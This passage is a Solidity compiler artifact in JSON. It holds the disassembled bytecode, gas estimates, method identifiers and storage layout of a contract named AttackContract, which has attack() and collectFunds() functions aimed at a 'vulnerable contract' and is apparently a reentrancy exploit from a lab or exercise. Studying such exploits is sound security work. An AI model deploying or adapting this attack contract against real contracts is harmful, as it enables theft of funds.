DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4F2 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x504 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x16B30085ABCB26F55A35299592DE22F97112DC376A3A7D9245B530B4E76A1021 PUSH1 0x40 MLOAD PUSH2 0x54D SWAP1 PUSH2 0x8FB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG2 PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x5B9 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x5CB JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x16B30085ABCB26F55A35299592DE22F97112DC376A3A7D9245B530B4E76A1021 PUSH1 0x40 MLOAD PUSH2 0x613 SWAP1 PUSH2 0x963 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG2 JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x46616C6C6261636B207472696767657265640000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x661 PUSH1 0x12 DUP4 PUSH2 0x61D JUMP JUMPDEST SWAP2 POP PUSH2 0x66C DUP3 PUSH2 0x62D JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x68E DUP2 PUSH2 0x655 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x6D7 PUSH2 0x6D2 PUSH2 0x6CD DUP5 PUSH2 0x695 JUMP JUMPDEST PUSH2 0x6B4 JUMP JUMPDEST PUSH2 0x695 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x6E8 DUP3 PUSH2 0x6BD JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x6F9 DUP3 PUSH2 0x6DE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x709 DUP2 PUSH2 0x6EF JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x722 PUSH0 DUP4 ADD DUP5 PUSH2 0x700 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x732 DUP3 PUSH2 0x695 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x742 DUP2 PUSH2 0x728 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x75B PUSH0 DUP4 ADD DUP5 PUSH2 0x739 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E6F74206F776E65722100000000000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x795 PUSH1 0xA DUP4 PUSH2 0x61D JUMP JUMPDEST SWAP2 POP PUSH2 0x7A0 DUP3 PUSH2 0x761 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x7C2 DUP2 PUSH2 0x789 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH0 PUSH2 0x7E1 PUSH0 DUP4 PUSH2 0x7C9 JUMP JUMPDEST SWAP2 POP PUSH2 0x7EC DUP3 PUSH2 0x7D3 JUMP JUMPDEST PUSH0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x800 DUP3 PUSH2 0x7D6 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x5472616E73616374696F6E204661696C65642100000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x83E PUSH1 0x13 DUP4 PUSH2 0x61D JUMP JUMPDEST SWAP2 POP PUSH2 0x849 DUP3 PUSH2 0x80A JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x86B DUP2 PUSH2 0x832 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x884 DUP2 PUSH2 0x872 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x89D PUSH0 DUP4 ADD DUP6 PUSH2 0x739 JUMP JUMPDEST PUSH2 0x8AA PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x87B JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x4465706F73697420636F6D706C65746564000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x8E5 PUSH1 0x11 DUP4 PUSH2 0x61D JUMP JUMPDEST SWAP2 POP PUSH2 0x8F0 DUP3 PUSH2 0x8B1 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x912 DUP2 PUSH2 0x8D9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x57697468647261772063616C6C65640000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x94D PUSH1 0xF DUP4 PUSH2 0x61D JUMP JUMPDEST SWAP2 POP PUSH2 0x958 DUP3 PUSH2 0x919 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x97A DUP2 PUSH2 0x941 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CODECOPY ADDMOD RETURNDATACOPY 0x2E SWAP14 MSTORE MCOPY MUL BALANCE SWAP14 0xBA KECCAK256 PUSH4 0x62A1A813 0x27 0xB9 0xA9 PUSH30 0x951318ED14625ABF1A75FD64736F6C634300081800330000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "497400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"": "infinite",
						"attack()": "infinite",
						"collectFunds()": "infinite",
						"owner()": "2530",
						"vulnerableContract()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"collectFunds()": "5b980628",
					"owner()": "8da5cb5b",
					"vulnerableContract()": "144166ae"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 11,
						"contract": "contracts/AttackContract.sol:AttackContract",
						"label": "vulnerableContract",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(IVulnerableContract)8"
					},
					{
						"astId": 13,
						"contract": "contracts/AttackContract.sol:AttackContract",
						"label": "owner",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_contract(IVulnerableContract)8": {
						"encoding": "inplace",
						"label": "contract IVulnerableContract",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}